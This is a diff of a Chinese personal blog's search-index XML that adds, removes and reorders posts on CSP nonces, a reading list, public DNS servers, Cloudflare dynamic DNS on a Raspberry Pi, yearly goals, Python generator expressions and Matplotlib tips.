+<h3 id="Nonce的部署方式"><a href="#Nonce的部署方式" class="headerlink" title="Nonce的部署方式"></a>Nonce的部署方式</h3><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><h5 id="script标签增加nonce属性"><a href="#script标签增加nonce属性" class="headerlink" title="script标签增加nonce属性"></a>script标签增加nonce属性</h5><p>我们可以通过构建的方式为页面中script标签添加nonce属性，并增加一个占位符，如</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"NONCE_TOKEN"</span>&gt;</span><span class="actionscript"><br>    <span class="hljs-comment">//....</span><br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><h5 id="生产唯一id，在CSP返回头中添加nonce-id-并将id替换html上的nonce占位符"><a href="#生产唯一id，在CSP返回头中添加nonce-id-并将id替换html上的nonce占位符" class="headerlink" title="生产唯一id，在CSP返回头中添加nonce-{id}并将id替换html上的nonce占位符"></a>生产唯一id，在CSP返回头中添加nonce-{id}并将id替换html上的nonce占位符</h5><p>方式一： 服务端处理</p>
+<ul>
+<li>当也买你在服务端渲染时，html作为模板在服务端进行处理后输出，我们可以在后端胜场威一id</li>
+<li>通过模板变量将id注入到html中实现替换NONCE_TOKEN占位符</li>
+<li>于此同时，将CSP返回头进行对应设置</li>
+</ul>
+<p>方式二： Nginx处理</p>
+<ul>
+<li>Nginx中可以使用内置变量的<code>$request_id</code> 作为唯一id，而当nginx版本不支持时，则可以借助lua去生产一个uuid</li>
+<li>接着通过Nginx的sub_filter NONCE_TOKEN ‘id’ 将页面中的NONCE_TOKEN占位符替换为id，或者使用lua进行替换</li>
+<li>最后使用<code>add_header Content-Security-Policy &quot;script-src &#39;nonce-{id}&#39;&quot;...</code> 添加对应的CSP返回头</li>
+</ul>
+<p>当然，为了避免攻击者提前注入一段脚本，并在script标签上同样添加了<code>nonce=&quot;NONCE_TOKEN&quot;</code>后端的“误”替换，导致这段提前注入的脚本进行执行。我们需要保密好项目的占位符，取一个特殊的占位符，并行动起来吧。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2019书单计划</title>
+    <url>/2019/04/24/booklist/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2019/04/24/5cc0164d939fc.jpg" alt="Book-list-2019"></br></p>
+<p>转眼间2019已经过去快一半的时间了，想到年初立的flag 虽然在做却没有及时的总结和复盘。<br>今天把今年需要读的书单发出来，以提醒自己。</p>
+<a id="more"></a>
+
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1217509&size=24" alt=""><br>月亮与六便士</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>刻意练习</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>动物农场</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>时间管理</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>微习惯</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>微精通</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>极简工作法</p>
+<h3 id="技术类"><a href="#技术类" class="headerlink" title="技术类"></a>技术类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>精通Scrapy网络爬虫</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>精通Python爬虫框架Scrapy</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>编程珠玑</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>编写可维护的JavaScript</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>Python编程无师自通</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>MicroPython for the Internet of Things</p>
+<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>图解HTTP</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1146989&size=32" alt=""><br>极客物理学</p>
+<h3 id="理财类"><a href="#理财类" class="headerlink" title="理财类"></a>理财类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1220091&size=24" alt=""><br>穷查理宝典</p>
+<h3 id="语言类"><a href="#语言类" class="headerlink" title="语言类"></a>语言类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=554753&size=32" alt=""><br>1368个单词就够了</p>
+<p><strong>另外还有eslpod 和englipod的音频 反复练习读听写</strong></br></p>
+<h2 id="todo-list"><a href="#todo-list" class="headerlink" title="todo list"></a>todo list</h2><ul>
+<li><input disabled="" type="checkbox"> 精通Scrapy网络爬虫 <img src="https://img.shields.io/badge/read-80-yellow.svg" alt=""></br></li>
+<li><input checked="" disabled="" type="checkbox"> 圣斗士星矢 <img src="http://progressed.io/bar/91" alt=""></br></li>
+<li><input checked="" disabled="" type="checkbox"> 万历十五年 <img src="http://progressed.io/bar/100" alt=""></br></li>
+<li><input checked="" disabled="" type="checkbox"> 动物农场（中文） <img src="http://progressed.io/bar/100" alt=""></br></li>
+<li><input checked="" disabled="" type="checkbox"> 日语五十音图详解  <img src="http://progressed.io/bar/100" alt=""></br></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ebook</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>ebook,kindle,collect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>decryption-javascript</title>
+    <url>/2021/02/25/decryption-javascript/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>domain-name-servers</title>
+    <url>/2017/05/16/domain-name-servers/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/QvrbvunLMzT1.jpg?imageslim" alt="mark"></p>
+<h4 id="dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。"><a href="#dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。" class="headerlink" title="dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。"></a>dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。</h4><a id="more"></a>
+<p>以下常见问题可通过修改dns解决。<br>1.电脑只能上QQ，不能访问网页。<br>2.iphone手机访问appstore非常慢。<br>3.打开某网站速度非常慢。</p>
+<p><strong>DNSPod DNS+：★★★★★（推荐）</strong><br>DNSPod的 Public DNS+是目前国内第一家支持ECS的公共DNS，是DNSPod推出的公共域名解析服务，可以为全网用户提供域名的公共递归解析服务！<br>DNS 服务器 IP 地址：<br>首选：119.29.29.29<br>备选：182.254.116.116<br>作者点评：测试数据显示Public DNS+国内数据均比114DNS好，强力推荐！</p>
+<p><strong>114DNS：★★★★★</strong><br>国内用户量巨大的DNS，访问速度快，各省都有节点，同时满足电信、联通、移动各运营商用户，可以有效预防劫持。<br>DNS 服务器 IP 地址：<br>首选：114.114.114.114<br>备选：114.114.114.115<br>作者点评：虽然测试结果比不上Public DNS+理想，但是也是非常不错的DNS！</p>
+<p><strong>阿里 AliDNS：★★★★</strong><br>阿里公共DNS是阿里巴巴集团推出的DNS递归解析系统，目标是成为国内互联网基础设施的组成部分，面向互联网用户提供“快速”、“稳定”、“智能”的免费DNS递归解析服务。<br>DNS 服务器 IP 地址：<br>首选：223.5.5.5<br>备选：223.6.6.6<br>作者点评：排名第三的DNS也不是吹的，只是节点貌似有点少。</p>
+<p><strong>DNS派：★★★★</strong><br>DNS派是聚流科技旗下的DNS服务平台,为个人用户、网站主、企业提供各种有关DNS业务的服务,包括个人上网的域名解析服务、网站授权解析服务、企业域名解析服务等。<br>DNS 服务器 IP 地址：<br>首选（电信/移动/铁通）：101.226.4.6<br>备选（电信/移动/铁通）：218.30.118.6<br>首选（联通）：123.125.81.6<br>备选（联通）：140.207.198.6<br>作者点评：360出品！测试结果还不错！</p>
+<p><strong>百度 BaiduDNS：★★★</strong><br>百度DNS旗下云解析服务,依托百度一流基础设施和强大技术实力,为用户提供免费的、超越竞品的服务体验。没有套餐区分,安全,稳定,高效<br>DNS 服务器 IP 地址：<br>首选：180.76.76.76<br>作者点评：暂时不知道百度有多少节点。不过应该也不少吧。</p>
+<p><strong>CNNIC SDNS：★★★</strong><br>SDNS是由中国互联网络信息中心(CNNIC)正式推出的免费的公共云解析服务(SecureDNS,简称SDNS)。该服务可为广大网民提供安全、智能、高速的上网接入解析服务。<br>DNS 服务器 IP 地址：<br>首选：1.2.4.8<br>备选：210.2.4.8<br>作者点评：作为国家出品的DNS，有待测试……（你敢用吗？反正我不敢）</p>
+<p><strong>OpenDNS：★（不推荐）</strong><br>OpenDNS是一个免费的域名解析服务提供商（DNS）。创建于2006年，长期以来致力于为广大个人用户以及商务企业用户和公共领域提供免费的域名解析服务。<br>DNS 服务器 IP 地址：<br>首选：208.67.222.222<br>备选：208.67.220.220<br>作者点评：国内节点少！貌似就几个，不推荐使用！</p>
+<p><strong>Google DNS：★（强烈不推荐）</strong><br>谷歌公共域名解析服务（Google Public DNS）是由谷歌公司于2009年发布的一项新的DNS服务。主要为了替代ISPs或其他公司提供的DNS服务。<br>DNS 服务器 IP 地址：<br>首选：8.8.8.8<br>备选：8.8.4.4<br>作者点评：机房在国外，国内无节点！你如果用了谷歌DNS你的信息有可能会免费出国转一圈才回来！强烈不推荐使用！只适合国外用户使用！</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>collections</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Use Cloudflare as Dynamic DNS with Raspberry Pi</title>
+    <url>/2020/01/20/dynamicDNS/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200120/ftOc2kD3gjA9.png?imageslim" alt="mark"><br>pi-hole、Domoticz、Homebridge都已经安装好了，是时候设置个域名了，考虑到Cloudflare的强大，此次的DDNS将使用Cloudflare来实现。</p>
+<a id="more"></a>
+<h3 id="Cloudflare-控制台配置"><a href="#Cloudflare-控制台配置" class="headerlink" title="Cloudflare 控制台配置"></a>Cloudflare 控制台配置</h3><p>1️⃣ 登录<a class="link"   href="https://dash.cloudflare.com/"  target="_blank" rel="noopener">cloudflare<i class="fas fa-external-link-alt"></i></a>控制台。</br><br>2️⃣ 添加你要进行解析的域名</br><br>3️⃣ 添加一条默认的A记录，指向一个ipv4的地址。</br></p>
+<h4 id="Global-API-Key"><a href="#Global-API-Key" class="headerlink" title="Global API Key"></a>Global API Key</h4><p>如果使用动态域名，需要使用全局apikey来登录更新A记录的值</p>
+<ol>
+<li>在CloudFlare管理后台登录个人面板</li>
+<li>向下滑动找到全局api</li>
+<li>记录下api后边使用</li>
+</ol>
+<h3 id="在树莓派上面配置"><a href="#在树莓派上面配置" class="headerlink" title="在树莓派上面配置"></a>在树莓派上面配置</h3><ol>
+<li>DDclient<br>⚠️ 安装完成后需要跳过设置界面，因为后面需要覆盖此配置。<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-keyword">get</span> install ddclient libjson-<span class="hljs-keyword">any</span>-perl<br></code></pre></td></tr></table></figure></li>
+<li>更新ddclient<br>最新版的ddclient能够更好的支持cloudflare<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">wget https:<span class="hljs-comment">//files.pimylifeup.com/portforwarding/ddclient-3.9.0.tar.gz</span><br>tar -zxvf ddclient<span class="hljs-number">-3.9</span><span class="hljs-number">.0</span>.tar.gz<br></code></pre></td></tr></table></figure></li>
+<li>替换已经安装的路径<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">sudo cp -f ddclient<span class="hljs-number">-3.9</span><span class="hljs-number">.0</span>/ddclient /usr/sbin/ddclient<br></code></pre></td></tr></table></figure></li>
+<li>因为新版的ddclient 做了更改，所以我们需要在原版基础上修改一下文件位置<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">sudo mkdir <span class="hljs-regexp">/etc/</span>ddclient<br>sudo mv <span class="hljs-regexp">/etc/</span>ddclient.conf <span class="hljs-regexp">/etc/</span>ddclient<br></code></pre></td></tr></table></figure></li>
+<li>修改配置文件<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/ddclient/ddclient.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure>
+将下列配置添加到文件当中<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">protocol</span>=cloudflare<br><span class="hljs-attribute">server</span>=www.cloudflare.com<br><span class="hljs-attribute">login</span>=CLONDFLARE_LOGIN_MAIL #此处填写你的cf登录邮箱<br><span class="hljs-attribute">password</span>=GLOBAL_API_KEY #此处填写上面拿到的cf密钥<br><span class="hljs-attribute">zone</span>=YOUR_DOMAIN.COM  #填写你的域名地址<br>anything.YOUR_DOMAIN.COM #配置的域名地址<br></code></pre></td></tr></table></figure></li>
+<li>重启服务<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/etc/i</span>nit.d<span class="hljs-regexp">/ddclient restart</span><br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+        <category>Raspberry</category>
+        <category>Cloudflare</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -755,120 +971,84 @@ return result</code></pre><p>print(merge_lists([4, 5, 6], [-2, -1, 0, 7]))<br>Ou
       </tags>
   </entry>
   <entry>
-    <title>2019书单计划</title>
-    <url>/2019/04/24/booklist/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2019/04/24/5cc0164d939fc.jpg" alt="Book-list-2019"></br></p>
-<p>转眼间2019已经过去快一半的时间了，想到年初立的flag 虽然在做却没有及时的总结和复盘。<br>今天把今年需要读的书单发出来，以提醒自己。</p>
-<a id="more"></a>
-
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1217509&size=24" alt=""><br>月亮与六便士</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>刻意练习</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>动物农场</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>时间管理</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>微习惯</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>微精通</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1230961&size=24" alt=""><br>极简工作法</p>
-<h3 id="技术类"><a href="#技术类" class="headerlink" title="技术类"></a>技术类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>精通Scrapy网络爬虫</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>精通Python爬虫框架Scrapy</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>编程珠玑</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>编写可维护的JavaScript</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>Python编程无师自通</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>MicroPython for the Internet of Things</p>
-<p><img src="https://www.easyicon.net/api/resizeApi.php?id=1227798&size=24" alt=""><br>图解HTTP</p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1146989&size=32" alt=""><br>极客物理学</p>
-<h3 id="理财类"><a href="#理财类" class="headerlink" title="理财类"></a>理财类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=1220091&size=24" alt=""><br>穷查理宝典</p>
-<h3 id="语言类"><a href="#语言类" class="headerlink" title="语言类"></a>语言类</h3><p><img src="https://www.easyicon.net/api/resizeApi.php?id=554753&size=32" alt=""><br>1368个单词就够了</p>
-<p><strong>另外还有eslpod 和englipod的音频 反复练习读听写</strong></br></p>
-<h2 id="todo-list"><a href="#todo-list" class="headerlink" title="todo list"></a>todo list</h2><ul>
-<li><input disabled="" type="checkbox"> 精通Scrapy网络爬虫 <img src="https://img.shields.io/badge/read-80-yellow.svg" alt=""></br></li>
-<li><input checked="" disabled="" type="checkbox"> 圣斗士星矢 <img src="http://progressed.io/bar/91" alt=""></br></li>
-<li><input checked="" disabled="" type="checkbox"> 万历十五年 <img src="http://progressed.io/bar/100" alt=""></br></li>
-<li><input checked="" disabled="" type="checkbox"> 动物农场（中文） <img src="http://progressed.io/bar/100" alt=""></br></li>
-<li><input checked="" disabled="" type="checkbox"> 日语五十音图详解  <img src="http://progressed.io/bar/100" alt=""></br></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ebook</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>ebook,kindle,collect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Matplotlib常见问题</title>
-    <url>/2020/01/10/Matplotlib/</url>
-    <content><![CDATA[<p><a href="https://imgchr.com/i/lfzqat" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/10/lfzqat.md.jpg" alt="lfzqat.md.jpg"></a><br>最近接了不少学生作业大多数都是预测和数据分析以及分类器相关，所用图表展示用到Matplotlib，经常会涉及到一些问题，对出现的问题进行整理，避免重复踩坑。</p>
-<a id="more"></a>
-
+    <title>2020总结及2021年展望</title>
+    <url>/2021/02/04/flags-2021/</url>
+    <content><![CDATA[<p>2020总结及2021年展望</p>
+<p>Funny things😜</p>
 <ol>
-<li><strong>中文显示乱码问题</strong><br>图表展示，图例等标识都需要用到中文，如果MATPLOTLIB缺少中文字体的调用，图表显示的时候会出现乱码。</li>
+<li>张大妈粉丝突破一千。<br><img src="https://images.yrzdm.com/imgs/20210204/JE0T2dMfjobI.jpg" alt="张大妈"></li>
+<li>成为湖北宜昌移动的合作伙伴，帮助湖北异常移动公司开发了多个内部应用。<br><img src="https://images.yrzdm.com/imgs/20210204/NResalwfp4O7.jpg?imageslim" alt="湖北移动-宜昌分公司"></li>
+<li>兼职，为在校学生设计svm分类器作业，物体识别训练的作业。以及多个商业爬虫项目的制作。</li>
+<li>参与开源项目的翻译repo</li>
+<li>为AntV G2提交repo</li>
 </ol>
-<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>from matplotlib.figure <span class="hljs-keyword">import</span> Figure<br><br># 正常显示画图时出现的中文和负号<br>from pylab <span class="hljs-keyword">import</span> mpl<br>mpl.rcParams[<span class="hljs-string">'font.sans-serif'</span>]=[<span class="hljs-string">'SimHei'</span>]<br>mpl.rcParams[<span class="hljs-string">'axes.unicode_minus'</span>]=False<br></code></pre></td></tr></table></figure>
-<ol start="2">
-<li><strong>tight_layout()</strong><br>Matplotlib v1.1 引入一个新的命令tight_layout(),用来调整子图参数，使之填充图像区域，解决Axes轴标签、标题、刻度超出图形区域的问题。</li>
+<p>Physical condition</p>
+<ol>
+<li>Pushups 100 计划未执行，未持续执行。❌</li>
+<li>宋健民的速效感冒灵的使用，未执行。❌</li>
+<li>哑铃肌肉锻炼，未持续执行。❌</li>
+<li>负重深蹲联系，未持续执行。❌</li>
 </ol>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">def show(self):<br>    self.figure.tight_layout()<br>    FigureCanvasAgg.draw(self)<br>    <span class="hljs-keyword">if</span><span class="hljs-built_in"> PORT </span>is None:<br>        return<br><br>    <span class="hljs-keyword">if</span> matplotlib.__version__ &lt; <span class="hljs-string">'1.2'</span>:<br>        buffer = self.tostring_rgb(0, 0)<br>    <span class="hljs-keyword">else</span>:<br>        buffer = self.tostring_rgb()<br><br>    <span class="hljs-keyword">if</span> len(<span class="hljs-builtin-name">set</span>(buffer)) &lt;= 1:<br>        # <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> plot empty<br>        return<br><br>    render = self.get_renderer()<br>    width = int(render.width)<br><br>    plot_index = index <span class="hljs-keyword">if</span> os.getenv(<span class="hljs-string">"PYCHARM_MATPLOTLIB_INTERACTIVE"</span>, <span class="hljs-literal">False</span>) <span class="hljs-keyword">else</span> -1<br>    try:<br>        sock = socket.socket()<br>        sock.connect((HOST, PORT))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, width))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, plot_index))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, len(buffer)))<br>        sock.send(buffer)<br>    except OSError as _:<br>        # <span class="hljs-literal">nothing</span> bad. It just means, that our<span class="hljs-built_in"> tool </span>window doesn<span class="hljs-string">'t run yet<br>        pass</span><br></code></pre></td></tr></table></figure>
-<p>当axes列表为空的时候,tight_layout()将会报错，此时需要将plt.show()替换为plt.savefig(‘file.png’,bbox_inches=’tight’)</p>
+<p>Books 📓</p>
+<ol>
+<li><p>你当像鸟飞往你的山</p>
+</li>
+<li><p>C++编程思想</p>
+</li>
+<li><p>Python面试题汇总</p>
+</li>
+<li><p>Java编程思想</p>
+</li>
+<li><p>刑法学讲义</p>
+</li>
+<li><p>子弹笔记</p>
+</li>
+<li><p>蛊惑世界的力量</p>
+<p>忍不住骂自己，书看的还是太太太少…这特么一年都干了些啥。😡 生气</p>
+</li>
+</ol>
+<p>ToDO 2021</p>
+<p>[] 考研</p>
+<p>[] 带宝去皮肤病医院</p>
+<p>[] 车辆刹车油更换，车轮X换位。</p>
+<p>[] 外出旅行一次</p>
+<p>[] 张大妈破w粉，成为生活家</p>
+<p>[] 如果时间允许，体验顺丰快递员，体验兼职司机。</p>
+<p>[] 关于宝成长教育的思考，实践</p>
+<p>[] 储藏室创业项目的启动</p>
+<p>[]  健身计划</p>
 ]]></content>
       <categories>
         <category>docs</category>
-        <category>python</category>
+        <category>flag</category>
         <category>index</category>
       </categories>
       <tags>
-        <tag>Python</tag>
-        <tag>MatPlotlib</tag>
+        <tag>Flag</tag>
       </tags>
   </entry>
   <entry>
-    <title>及时行乐</title>
-    <url>/2018/08/03/about/</url>
-    <content><![CDATA[<p>及时行乐（Enjoy Pleasure in Good Time.）<br><img src="https://i.loli.net/2018/08/03/5b63cc6e20cd8.png" alt="epgt"></p>
+    <title>使用生成器表达式来改写数据量比较大列表推导</title>
+    <url>/2020/04/17/generator-expression/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200417/JixsvvVoQCNj.png?imageslim" alt="generator expression"></p>
 <blockquote>
-<p>人生苦短,何不及时行乐</br><br>释义：抓紧时机，不失时机，寻欢作乐。</br></p>
+<p>列表推导的缺点是：在推导过程中，对于输入序列的每个值都要创建仅含一项元素的全新列表。如果数据量较大会消耗大量内存，导致程序崩溃。</p>
 </blockquote>
 <a id="more"></a>
-<p>出处:《新刊大宋宣和遗事》：“人生如白驹过隙，倘不及时行乐，则老大徒伤悲也。”</br><br>例句：短歌行（曹操）对酒当歌，人生几何？ 譬如朝露，去日苦多。 慨当以慷，忧思难忘。 何以解忧？唯有杜康。</p>
-<p>So, there you have it… enjoy!</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>collect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>csp-nonce 守护inline Script</title>
-    <url>/2020/10/26/csp-nonce/</url>
-    <content><![CDATA[<p>在<a href="https://cx4.github.io/2020/10/22/csp-xss/">XSS终结者</a>一文中，讲述了CSP基础语法组成与使用方式。最终我们利用CSP提供的域名白名单机制，有效地将异常的外联脚本拦在门外。然而在线上环境千千万万，虽然我们限制了外联脚本，但是内联脚本却钻了空。</p>
-<a id="more"></a>
-<h3 id="CSP-unsafe-inline"><a href="#CSP-unsafe-inline" class="headerlink" title="CSP unsafe-inline"></a>CSP unsafe-inline</h3><p>CSP的默认策略是不允许inline脚本执行，所以当我们没有必要进行脚本inline时，CSP域名白名单的机制足以防范注入脚本的问题。然而在实际项目中，我们还是会因为一些场景需要将部分脚本进行inline。于是需要在CSP的规则中增加<code>script-src‘unsafe-inline’</code>配置允许inline资源执行。但也带来了新的隐患。</p>
-<p>允许inline资源执行，也意味着当恶意代码通过inline的方式注入到页面中执行时，页面将变得不再安全。如富文本中被插入一段script代码（没被转义），或者是通过浏览器插件的方式进行代码注入等方式。</p>
-<p><code>Content-Security-Policy： script-src &#39;unsafe-inline&#39;</code></p>
-<h3 id="CSP-nonce"><a href="#CSP-nonce" class="headerlink" title="CSP nonce"></a>CSP nonce</h3><p>为了避免上述问题，我们可以使用<code>nonce</code>方式加强的CSP策略，nonce方式是至每次页面访问都产生一个唯一id，通过给内联脚本增加一个nonce属性，并且使其属性值（id）与返回的CSP nonce-{id}对应。只有当两者一致时，对应的内敛脚本才被允许执行。于是，即使网页被注入异常的脚本，因为攻击者不知道当时的nonce的随机id值，所以注入的脚本不会被执行。从而让网页变得更加安全。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">Content-Security-Policy:script-src 'nonce-5fAiFfSghuhdf'<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"5fAiFfSghuhdf"</span>&gt;</span><span class="actionscript"><br>    <span class="hljs-comment">//.....</span><br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>那么，当我们通过动态生成脚本并进行插入时，nonce也会将我们正常的代码拦截在外。所以在这种场景下，我们需要配套使用CSP提供的<code>strict-dynamic</code>,<code>strict-dynamic</code>模式允许让被信任的脚本插入并放行正常的脚本执行。</p>
-<p><code>Content-Security-Policy:script-src &#39;nonce-5fAiFfSghuhdf&#39; &#39;strict-dynamic&#39;</code></p>
-<h3 id="Nonce的部署方式"><a href="#Nonce的部署方式" class="headerlink" title="Nonce的部署方式"></a>Nonce的部署方式</h3><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><h5 id="script标签增加nonce属性"><a href="#script标签增加nonce属性" class="headerlink" title="script标签增加nonce属性"></a>script标签增加nonce属性</h5><p>我们可以通过构建的方式为页面中script标签添加nonce属性，并增加一个占位符，如</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"NONCE_TOKEN"</span>&gt;</span><span class="actionscript"><br>    <span class="hljs-comment">//....</span><br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="推导代码："><a href="#推导代码：" class="headerlink" title="推导代码："></a>推导代码：</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">value = [len(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> open(<span class="hljs-string">'\file.txt'</span>)]<br>print(value)<br></code></pre></td></tr></table></figure>
 
-<h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><h5 id="生产唯一id，在CSP返回头中添加nonce-id-并将id替换html上的nonce占位符"><a href="#生产唯一id，在CSP返回头中添加nonce-id-并将id替换html上的nonce占位符" class="headerlink" title="生产唯一id，在CSP返回头中添加nonce-{id}并将id替换html上的nonce占位符"></a>生产唯一id，在CSP返回头中添加nonce-{id}并将id替换html上的nonce占位符</h5><p>方式一： 服务端处理</p>
-<ul>
-<li>当也买你在服务端渲染时，html作为模板在服务端进行处理后输出，我们可以在后端胜场威一id</li>
-<li>通过模板变量将id注入到html中实现替换NONCE_TOKEN占位符</li>
-<li>于此同时，将CSP返回头进行对应设置</li>
-</ul>
-<p>方式二： Nginx处理</p>
-<ul>
-<li>Nginx中可以使用内置变量的<code>$request_id</code> 作为唯一id，而当nginx版本不支持时，则可以借助lua去生产一个uuid</li>
